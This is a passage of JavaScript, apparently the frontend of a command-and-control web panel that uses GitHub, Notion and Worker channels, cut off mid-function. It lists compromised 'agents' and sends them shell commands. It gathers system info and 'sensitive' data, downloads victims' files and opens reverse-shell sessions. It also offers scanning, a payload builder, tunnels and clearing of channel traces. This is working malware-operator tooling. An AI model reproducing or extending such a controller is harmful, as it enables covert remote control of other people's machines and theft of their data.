/* ──────────────────────────────────────────────────────────────────────────
   GitHub C2 Web Controller — Frontend Logic (v2)
   Bugs fixed:
     - SSE duplicate "message" listener merged; named events use correct names
     - Scan now constructs proper "scan host ports" command
     - Downloads tab loads and displays local downloaded files
     - Agent notes: inline edit on card, modal save
────────────────────────────────────────────────────────────────────────── */

// ── State ──────────────────────────────────────────────────────────────────

let _authExpired = false;
const _origFetch = window.fetch.bind(window);
window.fetch = async function (input, init) {
  const r = await _origFetch(input, init);
  const url = typeof input === "string" ? input : (input && input.url) || "";
  if (r.status === 401 && /\/(api|stream)\b/.test(url)) _onUnauthorized();
  return r;
};

function _onUnauthorized() {
  if (_authExpired) return;
  _authExpired = true;
  if (typeof _sse !== "undefined" && _sse) {
    try { _sse.close(); } catch (_) {}
    _sse = null;
  }
  toast("会话已过期，请重新登录（地址栏加 ?login=用户&pass=密码）", "error");
  const bar = document.getElementById("settings-status");
  if (bar) {
    bar.style.color = "var(--red)";
    bar.textContent = "⚠ 会话已过期，API 已停止。请用 ?login= 与 ?pass= 重新打开本页。";
  }
}

const S = {
  selectedAgent:  null,
  agents:         [],
  cmdHistory:     JSON.parse(localStorage.getItem("c2_cmd_history") || "[]"),  // persisted ↑/↓ history
  histIdx:        -1,
  cmdMap:         {},   // cmd_id → cmd_text  (capped at 1000 entries)
  pendingCmds:    new Set(),
  sysinfoRequested:  false,
  sensitiveRequested: false,
  _noteAgentId:   null,
  // UI state (vibeprompts.dev refresh)
  agentsLoading:  true, // skeleton rows while /api/agents is in flight
  agentFilter:    "",   // sidebar search box
  termSearch:     "",   // terminal line filter
  termChips:      { cmd: true, resp: true, sys: true },
  termLive:       true, // auto-scroll unless the user scrolled up
};

function _rebindSelectedAgent(incoming) {
  if (!S.selectedAgent) return;
  const prev = S.selectedAgent.id;
  const prevSibs = new Set(S.selectedAgent.sibling_ids || [prev]);
  const next = incoming.find(a =>
    a.id === prev ||
    (a.sibling_ids || []).some(id => id === prev || prevSibs.has(id)));
  if (next) S.selectedAgent = next;
}

function _forSelected(agentId) {
  const a = S.selectedAgent;
  if (!a || agentId == null) return false;
  if (a.id === agentId) return true;
  const sibs = a.sibling_ids || [];
  return sibs.includes(agentId);
}

// ── SSE ────────────────────────────────────────────────────────────────────

let _sse = null;

function connectSSE() {
  if (_sse) _sse.close();
  _sse = new EventSource("/stream");

  // Default "message" event: only fires for unnamed SSE data (e.g. "data: connected")
  _sse.onmessage = () => {};   // absorb, nothing needed

  // Named: new agent response (renamed from "message" to avoid collision)
  _sse.addEventListener("response", e => {
    const d = JSON.parse(e.data);
    // Intercept scan command responses → route to scan output area, not Terminal
    if (d.response_to && _scanCmdIds.has(d.response_to)) {
      _scanCmdIds.delete(d.response_to);   // one-shot: remove after receiving
      scanAppendOutput(d.content, d.timestamp);
      return;
    }
    if (_forSelected(d.agent_id)) {
      appendResponseMsg(d.content, d.response_to, d.timestamp);
    }
  });

  // Named: command sent confirmation
  _sse.addEventListener("command_sent", e => {
    const d = JSON.parse(e.data);
    if (!_forSelected(d.agent_id) && !(d.sibling_ids || []).some(id => _forSelected(id))) return;
    if (d.command_id) {
      S.cmdMap[d.command_id] = d.command;
      const keys = Object.keys(S.cmdMap);
      if (keys.length > 1000) delete S.cmdMap[keys[0]];
    }
    if (!d.is_file) {
      // Only add to terminal if not already shown by sendCommand() direct path
      if (!document.getElementById(`cmd-${d.command_id}`)) {
        appendCommandMsg(d.command, d.command_id, d.timestamp);
      }
      S.pendingCmds.add(d.command_id);
    }
  });

  // Named: file preview (readfile command response) → magic-sniffed modal
  _sse.addEventListener("file_preview", e => {
    const d = JSON.parse(e.data);
    if (!_forSelected(d.agent_id)) return;
    try {
      const payload = JSON.parse(d.data);
      openPreviewModal(payload);
    } catch {
      // Non-JSON preview payload (e.g. "[FILE_PREVIEW_NOTICE] too large") —
      // surface it in the terminal instead of silently dropping.
      const out = document.getElementById("terminal-output");
      const el  = document.createElement("div");
      el.className = "msg-response";
      el.style.whiteSpace = "pre-wrap";
      el.textContent = d.data;
      out.appendChild(el);
      updateTermStatus();
      scrollTerminal();
      closePreview();
    }
  });

  // Named: file list updated
  _sse.addEventListener("file_list", e => {
    const d = JSON.parse(e.data);
    if (_forSelected(d.agent_id)) {
      renderFileList(d.path, d.entries);
    }
  });

  // Named: file downloaded to server disk (direct upload or sendit.sh)
  _sse.addEventListener("file_downloaded", e => {
    const d = JSON.parse(e.data);
    if (d.error) {
      toast(`✗ Download failed: ${d.filename} — ${d.error}`, "error");
    } else {
      const method = d.method === "sendit" ? " via sendit.sh" : "";
      toast(`✅ Downloaded: ${d.filename} (${fmtSize(d.size)})${method}`, "success");
      // Auto-refresh Library tab if it's active for this agent
      if (_forSelected(d.agent_id) &&
          document.querySelector("#panel-library.active")) {
        loadLibrary();
      }
    }
  });

  // Named: sysinfo collected
  _sse.addEventListener("sysinfo", e => {
    const d = JSON.parse(e.data);
    if (_forSelected(d.agent_id)) {
      renderSysinfo(d.content, d.collected_at);
      refreshSysinfoHistory();
    }
  });

  // Named: sensitive collected
  _sse.addEventListener("sensitive", e => {
    const d = JSON.parse(e.data);
    if (_forSelected(d.agent_id)) {
      renderSensitive(d.content, d.collected_at);
      refreshSensitiveHistory();
    }
  });

  // Named: agents list updated — merge notes from old list to preserve them
  _sse.addEventListener("agents_updated", e => {
    const d = JSON.parse(e.data);
    const incoming = d.agents || [];
    const oldNotes = {};
    for (const a of S.agents) { if (a.note) oldNotes[a.id] = a.note; }
    for (const a of incoming) { if (!a.note && oldNotes[a.id]) a.note = oldNotes[a.id]; }
    S.agents = incoming;
    _rebindSelectedAgent(incoming);
    S.agentsLoading = false;
    renderAgents();
    loadStats();   // KPI cards / mini stats may have changed
  });

  // Named: notification (cleanup, etc.)
  _sse.addEventListener("notification", e => {
    const d = JSON.parse(e.data);
    const kind = (d.type === "decrypt_mismatch" || (d.type || "").startsWith("sendit_"))
      ? "error" : "info";
    toast(d.message || "notification", kind);
  });

  _sse.onerror = () => {
    if (_authExpired) return;
    _origFetch("/api/stats").then(r => {
      if (r.status === 401) _onUnauthorized();
      else setTimeout(() => {
        connectSSE();
        if (S.selectedAgent) loadMessages();
      }, 3000);
    }).catch(() => { if (!_authExpired) setTimeout(() => {
      connectSSE();
      if (S.selectedAgent) loadMessages();
    }, 3000); });
  };
}

// ── Tabs ───────────────────────────────────────────────────────────────────

function switchTab(name) {
  document.querySelectorAll(".tab-btn").forEach(b =>
    b.classList.toggle("active", b.dataset.tab === name));
  // 侧栏"控制台工具"组同步高亮（这些页面不属于顶部 agent 操作区）
  document.querySelectorAll(".tool-nav").forEach(b =>
    b.classList.toggle("active", b.dataset.tab === name));
  document.querySelectorAll(".tab-panel").forEach(p =>
    p.classList.toggle("active", p.id === `panel-${name}`));
  moveTabIndicator();

  // Settings is always accessible regardless of agent selection
  const agentFree = ["settings", "builder", "mcp"];
  if (agentFree.includes(name)) {
    document.getElementById("no-agent-msg").style.display = "none";
    document.getElementById("tab-panels").style.display   = "flex";
  } else if (!S.selectedAgent) {
    document.getElementById("no-agent-msg").style.display = "flex";
    document.getElementById("tab-panels").style.display   = "none";
    return;
  }

  if (name === "scan")      onScanTab();
  if (name === "builder")   onBuilderTab();
  if (name === "sysinfo") { onSysInfoTab(); onSensitiveTab(); }
  if (name === "settings") { _settingsReady = false; loadSettings(); loadWorkerAdmin(); }
  if (name === "upgrade")   loadUpgradeFields();
  if (name === "tunnel")    loadTunnelConfig();
  if (name === "library")   loadLibrary();
  if (name === "report")    loadReport();
  if (name === "mcp")       loadMcpGuide();
  if (name === "wsshell")   _wsshellOnTabActive();
  if (name === "files" && S.selectedAgent) loadFileCache(
    document.getElementById("files-path").value || "/"
  );

  // Update agent indicator on tabs that send commands to a specific agent
  _updateAgentIndicators();
}

function _updateAgentIndicators() {
  const a = S.selectedAgent;
  const label = a ? `🎯 ${a.hostname || 'unknown'} (${a.privilege || 'user'})` : "";
  ["tunnel-agent-indicator", "scan-agent-indicator", "upg-agent-indicator", "wsshell-agent-indicator", "files-agent-indicator"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = label || "No agent selected";
  });
}

document.querySelectorAll(".tab-btn").forEach(btn =>
  btn.addEventListener("click", () => switchTab(btn.dataset.tab)));

// ── Tab indicator (vibeprompts.dev: nav-sliding-underline-tabs) ────────────
// The active underline is one absolutely-positioned 2px bar that is moved and
// resized via inline styles, never re-rendered.

function moveTabIndicator() {
  const bar = document.getElementById("tab-bar");
  const ind = document.getElementById("tab-indicator");
  const btn = bar && ind ? bar.querySelector(".tab-btn.active") : null;
  if (!ind || !btn) return;
  ind.style.left  = `${btn.offsetLeft}px`;
  ind.style.width = `${btn.offsetWidth}px`;
}

window.addEventListener("resize", moveTabIndicator);

// Arrow-key tab navigation (skipped while typing in a field)
document.addEventListener("keydown", e => {
  if (e.key !== "ArrowLeft" && e.key !== "ArrowRight") return;
  const t = e.target;
  if (t && (t.tagName === "INPUT" || t.tagName === "TEXTAREA" ||
            t.tagName === "SELECT" || t.isContentEditable)) return;
  const btns = [...document.querySelectorAll(".tab-btn")];
  const cur  = btns.findIndex(b => b.classList.contains("active"));
  if (cur < 0) return;
  const nxt = e.key === "ArrowRight"
    ? Math.min(btns.length - 1, cur + 1)
    : Math.max(0, cur - 1);
  if (nxt !== cur) {
    e.preventDefault();
    switchTab(btns[nxt].dataset.tab);
    btns[nxt].focus();
  }
});

// ── Agent Selection ────────────────────────────────────────────────────────

// Online status classification with hysteresis.
// Poll interval stretches under SessionHeat (and pauses outside time windows),
// so tight thresholds made every agent flicker online/offline. Rules:
//   - widening: online 5 min, idle 30 min
//   - demotion (online→idle→offline) needs TWO consecutive samples; promotion
//     (any fresh reply) applies immediately — status never flaps on one slow poll.
const _statusMem = {};   // agentId → { shown, strikes }
function isAgentOnline() {
  if (!S.selectedAgent) return false;
  const st = agentStatus(S.selectedAgent);
  return st.label === "在线" || st.label === "Idle" || st.label === "Online";
}

function agentStatus(a) {
  const ago = a.last_reply_ago;
  let target;
  if (ago === null || ago === undefined)
    target = { cls: "chip-offline", label: "unknown", dot: "#888", title: "无任何活动记录" };
  else if (ago < 300)
    target = { cls: "chip-online", label: "在线", dot: "#3fb950", title: `${ago}s 前活跃` };
  else if (ago < 1800)
    target = { cls: "chip-idle", label: "空闲", dot: "#d29922", title: `${Math.round(ago/60)} 分钟前活跃` };
  else
    target = { cls: "chip-offline", label: "离线", dot: "#da3633", title: `最后活跃于 ${Math.round(ago/60)} 分钟前` };

  const mem = _statusMem[a.id] || (_statusMem[a.id] = { shown: null, strikes: 0 });
  if (!mem.shown) { mem.shown = target; mem.strikes = 0; return target; }   // first paint
  if (target.label === mem.shown.label) { mem.strikes = 0; return mem.shown; }
  const rank = { "在线": 3, "空闲": 2, "离线": 1, "unknown": 0 };
  if ((rank[target.label] ?? 0) > (rank[mem.shown.label] ?? 0)) {   // promotion: immediate
    mem.shown = target; mem.strikes = 0; return target;
  }
  mem.strikes++;                                                     // demotion: needs 2 samples
  if (mem.strikes >= 2) { mem.shown = target; mem.strikes = 0; return target; }
  return mem.shown;
}

// Skeleton rows shown while the agent list is loading
// (vibeprompts.dev: bonus-skeleton-loading-state)
const _SKEL_ROWS = [[70, 45], [55, 62], [80, 35], [62, 50]];
function _skeletonAgentsHtml() {
  return _SKEL_ROWS.map(([w1, w2]) => `
    <div class="skel-row">
      <div class="skel-avatar"></div>
      <div class="skel-lines">
        <div class="skel-bar" style="width:${w1}%"></div>
        <div class="skel-bar" style="width:${w2}%"></div>
      </div>
      <div class="skel-bar skel-right"></div>
    </div>`).join("");
}

// Sidebar search box → live filter
// (vibeprompts.dev: dashboards-data-table-with-toolbar)
document.getElementById("agent-search").addEventListener("input", e => {
  S.agentFilter = e.target.value.trim().toLowerCase();
  renderAgents();
});

function _agentMatchesFilter(a, repo) {
  const q = S.agentFilter;
  if (!q) return true;
  const hay = [a.hostname, a.username, a.os, a.privilege, a.id, repo,
               a.note, a.arch, a.kernel].filter(Boolean).join(" ").toLowerCase();
  return hay.includes(q);
}

function renderAgents() {
  const container = document.getElementById("agents-container");
  const countEl   = document.getElementById("agent-count");
  const total     = S.agents.length;

  // Loading: pulsing skeleton rows
  if (S.agentsLoading) {
    countEl.textContent = "…";
    container.innerHTML = _skeletonAgentsHtml();
    return;
  }

  // Header count shows "shown/total" while filtering
  const filtered = S.agents.filter(a => _agentMatchesFilter(a, a.repo));
  countEl.textContent = S.agentFilter ? `${filtered.length}/${total}` : `${total}`;

  if (!total) {
    container.innerHTML = '<div class="no-agents">No agents — click Refresh</div>';
    return;
  }
  if (!filtered.length) {
    container.innerHTML =
      `<div class="no-agents">🔍 没有匹配 “${esc(S.agentFilter)}” 的 Agent</div>`;
    return;
  }

  // Group agents by repo
  const groups = {};
  for (const a of filtered) {
    const repo = a.repo || "unknown";
    if (!groups[repo]) groups[repo] = [];
    groups[repo].push(a);
  }

  const repoKeys = Object.keys(groups).sort();
  // Always show group headers so the user knows which repo/database each agent belongs to
  let html = "";
  for (const repo of repoKeys) {
    // Sort agents: most-recently-seen first; use id as stable tiebreaker
    groups[repo].sort((a, b) => {
      const ta = a.last_seen ? new Date(a.last_seen).getTime() : 0;
      const tb = b.last_seen ? new Date(b.last_seen).getTime() : 0;
      if (tb !== ta) return tb - ta;
      return (a.id || "").localeCompare(b.id || "");
    });
    const firstAgent = groups[repo][0];
    const ch = firstAgent?.channel === "notion" ? "📓" : (firstAgent?.channel === "worker" ? "☁️" : "🐙");
    const shortRepo = repo.includes("/") ? repo.split("/")[1] : (repo.length > 20 ? repo.slice(0,8)+"…"+repo.slice(-4) : repo);
    html += `<div class="agent-group-header">${ch} ${esc(shortRepo)}</div>`;
    for (const a of groups[repo]) {
      html += _renderAgentCard(a);
    }
  }
  container.innerHTML = html;
}

function _renderAgentCard(a) {
  const sel  = S.selectedAgent?.id === a.id || (S.selectedAgent?.sibling_ids || []).includes(a.id);
  const pCls = a.privilege === "root" ? "priv-root" : "priv-user";
  const ts   = a.last_seen ? new Date(a.last_seen).toLocaleString() : "";
  const note = a.note ? `<div class="agent-note">${esc(a.note)}</div>` : "";
  const chans = a.channels && a.channels.length ? a.channels : [a.channel || "github"];
  const chBadge = chans.map(c => c === "worker" ? "☁️" : c === "notion" ? "📓" : "🐙").join("+");

  // Colored status dot + chip (same rule as the sidebar dot)
  const st   = agentStatus(a);
  const dot  = `<span title="${esc(st.title)}" style="display:inline-block;width:8px;height:8px;border-radius:50%;background:${st.dot};margin-right:5px;flex-shrink:0"></span>`;

  return `
    <div class="agent-card${sel ? " selected" : ""}" onclick="selectAgent('${String(a.id).replace(/'/g, "\'")}')">
      <div class="agent-hostname" style="display:flex;align-items:center">${dot}${esc(a.hostname)}</div>
      <div class="agent-meta">
        <span class="agent-chip ${st.cls}">${st.label}</span>
        <span class="agent-chip" title="${esc(chans.join(' + '))}">${chBadge}</span>
        <span class="priv-badge ${pCls}">${esc(a.privilege)}</span>
        <span class="agent-os">${esc(a.os)}</span>
        <span>·</span>
        <span>${esc(a.username)}</span>
        ${a.version && a.version !== "unknown" ? `<span class="agent-ver" title="Agent 版本（项 9 自上报）">v${esc(a.version)}</span>` : ""}
      </div>
      ${note}
      <div class="agent-time-row">
        <span class="agent-time">${ts}</span>
        <button class="note-btn" onclick="openNoteModal('${a.id}', event)"
                title="Edit note">✏️</button>
      </div>
    </div>`;
}

async function selectAgent(agentId) {
  const agent = S.agents.find(a => a.id === agentId);
  if (!agent) return;

  // ── 防误操作三件套 ────────────────────────────────────────────────────────
  // 1) 代计数：切换瞬间自增，一切在途异步渲染对不上代就丢弃（旧 agent 的
  //    慢响应永远不可能再画到屏幕上）。
  S.agentGen = (S.agentGen || 0) + 1;
  const gen  = S.agentGen;

  S.selectedAgent       = agent;
  S.sysinfoRequested    = false;
  S.sensitiveRequested  = false;
  S.cmdMap              = {};
  S.pendingCmds         = new Set();
  LIB.currentPath = null;
  LIB.currentName = null;
  LIB.unsaved     = false;
  // Reset Library editor when switching agents
  const _wrap = document.getElementById("lib-editor-wrap");
  if (_wrap && _wrap.style.display !== "none") {
    _wrap.style.display = "none";
    const _empty = document.getElementById("lib-editor-empty");
    if (_empty) _empty.style.display = "flex";
  }

  // 2) 立即清空所有 agent 专属视图 —— 不让上一个 agent 的内容多停留一毫秒
  const _clear = id => { const el = document.getElementById(id); if (el) el.innerHTML = ""; };
  _clear("terminal-output");
  _clear("files-body");
  _clear("sysinfo-content");
  _clear("sensitive-content");
  const _bar = document.getElementById("file-status-bar");
  if (_bar) _bar.textContent = `切换到 ${agent.hostname || agent.id}（${agent.username || "?"}）… 加载中`;
  const _bc = document.getElementById("files-breadcrumb");
  if (_bc) _bc.innerHTML = "";

  // 3) 面板指示器立刻指向新 agent（不等网络）
  document.getElementById("no-agent-msg").style.display = "none";
  document.getElementById("tab-panels").style.display   = "flex";
  _updateAgentIndicators();
  renderAgents();

  await loadMessages(gen);

  // 在途数据若已被更新的切换取代，直接停在这里
  if (gen !== S.agentGen) return;

  // WS Shell：活跃反弹会话仍属于上一个 agent —— 立即断开，防止在旧会话里
  // 敲命令误伤别的机器；随后界面回到"等待反弹"状态并提示对当前 agent 下发。
  const _sameWs = WSSHELL.boundAgent && (
    WSSHELL.boundAgent === agent.id ||
    (agent.sibling_ids || []).includes(WSSHELL.boundAgent)
  );
  if (WSSHELL.boundAgent && !_sameWs) {
    const oldId = WSSHELL.boundAgent;
    // 断开的是【旧】agent 的会话（boundAgent）；wsshellForceClose 读的是
    // S.selectedAgent——此刻已指向新 agent，会把断开命令发错对象。
    fetch("/api/wsshell/disconnect", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent_id: oldId }),
    }).catch(() => {});
    _wsshellOnAgentDisconnect();
    WSSHELL.boundAgent = null;
    toast(`WS Shell 会话属于其他 agent（${oldId}）——已自动断开，请对 ${agentTag()} 重新下发反弹`, "info");
  }

  // Restore this agent's last browsed path (falls back to /), then refresh
  filesRestorePath();

  // Re-trigger active tab
  const active = document.querySelector(".tab-btn.active")?.dataset.tab;
  if (active === "sysinfo") { onSysInfoTab(); onSensitiveTab(); }
  if (active === "library")   loadLibrary();
  if (active === "files")     filesRefresh(gen);
  if (active === "wsshell")   _wsshellOnTabActive();
  if (active === "report")    loadReport();
}

// ── Agent Notes ────────────────────────────────────────────────────────────

function openNoteModal(agentId, event) {
  event.stopPropagation();
  const card = S.agents.find(a => a.id === agentId
    || (a.sibling_ids || []).includes(agentId));
  S._noteAgentId = (card && card.id) || agentId;
  fetch(`/api/agents/${S._noteAgentId}/note`)
    .then(r => r.json())
    .then(d => {
      document.getElementById("note-input").value = d.note || "";
      document.getElementById("note-modal").style.display = "flex";
      document.getElementById("note-input").focus();
    });
}

function closeNoteModal() {
  document.getElementById("note-modal").style.display = "none";
  S._noteAgentId = null;
}

async function saveNote() {
  if (!S._noteAgentId) return;
  const note = document.getElementById("note-input").value.trim();
  const r = await fetch(`/api/agents/${S._noteAgentId}/note`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ note }),
  });
  if (!r.ok) { toast("Note save failed", "error"); return; }
  const target = S.agents.find(a => a.id === S._noteAgentId);
  const sibs = new Set([S._noteAgentId, ...((target && target.sibling_ids) || [])]);
  S.agents.forEach(a => {
    if (sibs.has(a.id) || (a.sibling_ids || []).some(id => sibs.has(id)))
      a.note = note;
  });
  renderAgents();
  closeNoteModal();
  toast("Note saved", "success");
}

// Close modal on backdrop click
document.getElementById("note-modal").addEventListener("click", e => {
  if (e.target.id === "note-modal") closeNoteModal();
});

// ── Terminal ───────────────────────────────────────────────────────────────

const MSG_PAGE_SIZE = 5;  // Messages shown per page (newest first)
let _msgOffset = 0;       // How many older messages have been loaded

async function loadMessages(loadAll = false, gen = null) {
  if (!S.selectedAgent) return;
  const myGen = gen ?? S.agentGen;
  // 默认只取最新一段（后端 400 条上限）；点"加载更早"时 ?all=1 拉全量
  const r   = await fetch(`/api/messages/${S.selectedAgent.id}${loadAll ? "?all=1" : ""}`);
  const d   = await r.json();
  // stale guard: a newer agent switch happened while we were fetching
  if (myGen !== null && myGen !== S.agentGen) return;
  S.cmdMap  = d.command_history || {};

  const msgs = d.messages || [];
  const out  = document.getElementById("terminal-output");
  out.innerHTML = "";
  _msgOffset = 0;

  if (msgs.length === 0) return;

  // Show newest MSG_PAGE_SIZE messages by default; older ones load on demand
  const showFrom = loadAll ? 0 : Math.max(0, msgs.length - MSG_PAGE_SIZE);
  const hidden   = showFrom;

  if (hidden > 0) {
    const btn = document.createElement("div");
    btn.id = "load-more-btn";
    btn.style.cssText = "text-align:center;padding:6px 0;cursor:pointer;font-size:11px;color:var(--text-2);border-bottom:1px solid var(--border);margin-bottom:4px";
    btn.textContent = `▲ 加载更早的 ${hidden} 条记录`;
    btn.onclick = () => loadMessages(true);
    out.appendChild(btn);
  }

  for (const m of msgs.slice(showFrom)) {
    if (m.is_command) {
      appendCommandMsg(m.content, m.command_id, m.timestamp, false);
    } else {
      appendResponseMsg(m.content, m.response_to, m.timestamp, false);
    }
  }
  scrollTerminal();
}

function appendCommandMsg(text, cmdId, ts, scroll = true) {
  const out  = document.getElementById("terminal-output");
  const wrap = document.createElement("div");
  wrap.id = `cmd-${cmdId}`;
  wrap.className = "t-cmd";
  wrap.innerHTML = `
    <div style="margin-top:8px">
      <span class="msg-command">${esc(text)}</span>
      <span class="msg-status pending" id="st-${esc(cmdId)}">[pending]</span>
      <span style="font-size:10px;color:var(--text-muted);margin-left:4px">${esc(ts||"")}</span>
    </div>
    <div id="resp-${esc(cmdId)}"></div>`;
  out.appendChild(wrap);
  _applyFiltersToNode(wrap);
  trimTerminal();
  updateTermStatus();
  if (scroll) scrollTerminal();
}

function appendResponseMsg(content, respTo, ts, scroll = true) {
  const container = respTo ? document.getElementById(`resp-${respTo}`) : null;
  const el = document.createElement("div");

  if (container) {
    el.className = "msg-response";
    el.textContent = content;
    container.appendChild(el);
    // Mark as done
    const st = document.getElementById(`st-${respTo}`);
    if (st) { st.className = "msg-status done"; st.textContent = "[done]"; }
    S.pendingCmds.delete(respTo);
  } else {
    const out = document.getElementById("terminal-output");
    el.className  = "msg-system t-sys";
    el.textContent = `[${ts}] ${content}`;
    out.appendChild(el);
    _applyFiltersToNode(el);
    trimTerminal();
  }
  updateTermStatus();
  if (scroll) scrollTerminal();
}

function scrollTerminal() {
  const out = document.getElementById("terminal-output");
  if (!S.termLive) return;   // user scrolled up → respect their position
  out.scrollTop = out.scrollHeight;
}

// ── Terminal live tail: filters / pause / buffer cap / status bar ───────────
// (vibeprompts.dev: dashboards-log-viewer-with-live-tail)

const TERM_MAX_NODES = 500;   // hard cap on buffered blocks (oldest dropped)

function toggleTermChip(kind) {
  S.termChips[kind] = !S.termChips[kind];
  const chip = document.getElementById(`term-chip-${kind}`);
  if (chip) chip.classList.toggle("active", S.termChips[kind]);
  applyTerminalFilters();
}

function _applyFiltersToNode(node) {
  const q = S.termSearch.trim().toLowerCase();
  let show = true;
  if (node.classList.contains("t-cmd") && !S.termChips.cmd) show = false;
  if (node.classList.contains("t-sys") && !S.termChips.sys) show = false;
  if (show && q && !node.textContent.toLowerCase().includes(q)) show = false;
  node.style.display = show ? "" : "none";
}

function applyTerminalFilters() {
  const out = document.getElementById("terminal-output");
  out.querySelectorAll(".t-cmd, .t-sys").forEach(_applyFiltersToNode);
  // resp chip hides every response block (they nest inside cmd wrappers)
  out.querySelectorAll(".msg-response").forEach(el => {
    el.style.display = S.termChips.resp ? "" : "none";
  });
  updateTermStatus();
}

function updateTermStatus() {
  const out = document.getElementById("terminal-output");
  const c   = document.getElementById("term-count");
  if (!out || !c) return;
  const cmds  = out.querySelectorAll(".t-cmd").length;
  const resps = out.querySelectorAll(".msg-response").length;
  const sys   = out.querySelectorAll(".t-sys").length;
  c.textContent = `${cmds} cmd · ${resps} resp · ${sys} sys`;
  let n;
  n = document.getElementById("tc-cmd");  if (n) n.textContent = cmds;
  n = document.getElementById("tc-resp"); if (n) n.textContent = resps;
  n = document.getElementById("tc-sys");  if (n) n.textContent = sys;
}

function trimTerminal() {
  const out = document.getElementById("terminal-output");
  const kids = out.children;
  while (kids.length > TERM_MAX_NODES) {
    // never remove the "load earlier messages" affordance
    const first = out.firstElementChild;
    if (!first || first.id === "load-more-btn") break;
    first.remove();
  }
}

function setTermLive(v) {
  S.termLive = v;
  const pill = document.getElementById("term-live-pill");
  const lbl  = document.getElementById("term-live-label");
  if (pill) pill.classList.toggle("paused", !v);
  if (lbl)  lbl.textContent = v ? "Live" : "Paused";
  if (v) scrollTerminal();
}

function toggleTermLive() { setTermLive(!S.termLive); }

// Auto-detect "user scrolled up" → pause; back near bottom → live again
document.getElementById("terminal-output").addEventListener("scroll", () => {
  const out = document.getElementById("terminal-output");
  const nearBottom = out.scrollHeight - out.scrollTop - out.clientHeight < 40;
  if (nearBottom !== S.termLive) setTermLive(nearBottom);
});

document.getElementById("term-search").addEventListener("input", e => {
  S.termSearch = e.target.value;
  applyTerminalFilters();
});

async function sendCommand() {
  const input = document.getElementById("terminal-input");
  let   cmd   = input.value.trim();
  if (!cmd || !S.selectedAgent) return;

  if (document.getElementById("chk-interactive").checked) {
    cmd = `interactive:${cmd}`;
  }

  S.cmdHistory.push(cmd);
  if (S.cmdHistory.length > 200) S.cmdHistory.shift();
  localStorage.setItem("c2_cmd_history", JSON.stringify(S.cmdHistory));
  S.histIdx   = -1;
  input.value = "";

  const r = await fetch("/api/command", {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({ agent_id: S.selectedAgent.id, command: cmd }),
  });

  const d = await r.json().catch(() => ({}));

  if (!r.ok) {
    toast(d.error || "Send failed", "error");
    return;
  }

  // Show command immediately — but guard against SSE arriving first (race condition)
  const cmdId = d.command_id;
  if (cmdId && !_isFileCmdJS(cmd)) {
    if (!document.getElementById(`cmd-${cmdId}`)) {   // guard: SSE may have beaten us
      appendCommandMsg(cmd, cmdId, new Date().toLocaleTimeString("en-GB", {hour12:false}));
    }
    S.cmdMap[cmdId]   = cmd;
    S.pendingCmds.add(cmdId);
  }
}

// Mirror of backend _is_file_cmd to skip showing file commands in terminal
function _isFileCmdJS(cmd) {
  const t = cmd.trim();
  return t === "ls" || t === "dir" ||
    t.startsWith("ls ") || t.startsWith("dir ") ||
    t.startsWith("readfile ") || t.startsWith("upload ") ||
    t.startsWith("upload_chunk ");
}

document.getElementById("terminal-input").addEventListener("keydown", e => {
  if (e.key === "Enter") {
    sendCommand();
  } else if (e.key === "ArrowUp") {
    e.preventDefault();
    if (S.histIdx === -1) S.histIdx = S.cmdHistory.length;
    S.histIdx = Math.max(0, S.histIdx - 1);
    document.getElementById("terminal-input").value = S.cmdHistory[S.histIdx] || "";
  } else if (e.key === "ArrowDown") {
    e.preventDefault();
    S.histIdx = Math.min(S.cmdHistory.length, S.histIdx + 1);
    document.getElementById("terminal-input").value = S.cmdHistory[S.histIdx] || "";
  }
});

async function clearHistory() {
  if (!S.selectedAgent) return;
  if (!confirm("清空本地终端记录，并尽量清理 GitHub/Worker 信道评论？\n（Notion 评论 API 无法删除，仅清本地）")) return;
  const r = await fetch("/api/history/clear", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body:   JSON.stringify({ agent_id: S.selectedAgent.id }),
  });
  if (!r.ok) { toast("Clear failed", "error"); return; }
  const d = await r.json().catch(() => ({}));
  document.getElementById("terminal-output").innerHTML = "";
  S.cmdMap = {}; S.pendingCmds = new Set();
  updateTermStatus();
  const warn = (d.warnings || []).join("；");
  toast(warn ? `本地已清空。${warn}` : "本地历史已清空", warn ? "info" : "success");
}

// ── Command history dropdown ────────────────────────────────────────────────

function toggleCmdHistory() {
  const drop = document.getElementById("cmd-history-drop");
  if (drop.style.display === "none") {
    renderCmdHistory("");
    drop.style.display = "block";
  } else {
    drop.style.display = "none";
  }
}

function renderCmdHistory(filter) {
  const drop = document.getElementById("cmd-history-drop");
  if (!drop) return;
  const items = [...S.cmdHistory].reverse()
    .filter(c => !filter || c.toLowerCase().includes(filter.toLowerCase()))
    .slice(0, 100);
  drop.innerHTML = items.length
    ? items.map(c =>
        `<div class="cmd-hist-item" style="padding:5px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-bottom:1px solid var(--border);white-space:nowrap;overflow:hidden;text-overflow:ellipsis"
              onclick="useCmdHistory(${JSON.stringify(c).replace(/"/g, "&quot;")})"
              title="${esc(c)}">❯ ${esc(c)}</div>`).join("")
    : `<div style="padding:10px;font-size:11px;color:var(--text-muted)">无历史命令</div>`;
}

function useCmdHistory(cmd) {
  document.getElementById("terminal-input").value = cmd;
  document.getElementById("cmd-history-drop").style.display = "none";
  document.getElementById("terminal-input").focus();
}

document.addEventListener("click", e => {
  const drop = document.getElementById("cmd-history-drop");
  if (drop && drop.style.display !== "none" && !e.target.closest("#cmd-history-drop") &&
      !e.target.closest("button[title='命令历史']")) {
    drop.style.display = "none";
  }
});

// 防误操作：所有破坏性确认框都带上目标 agent 身份
function agentTag() {
  const a = S.selectedAgent;
  return a ? `[${a.hostname || "?"} / ${a.username || "?"}]` : "";
}

// ── Files ──────────────────────────────────────────────────────────────────

function filesAgentKey() {
  const a = S.selectedAgent;
  if (!a) return null;
  if (a.agent_uuid) return `c2_files_path_u_${a.agent_uuid}`;
  const sibs = (a.sibling_ids || [a.id]).slice().sort().join("_");
  return `c2_files_path_${sibs}`;
}

function filesRestorePath() {
  const key = filesAgentKey();
  const el  = document.getElementById("files-path");
  if (!el) return;
  if (key) {
    const saved = localStorage.getItem(key);
    if (saved) { el.value = saved; return; }
  }
  el.value = "/";
}

function filesGo(path) {
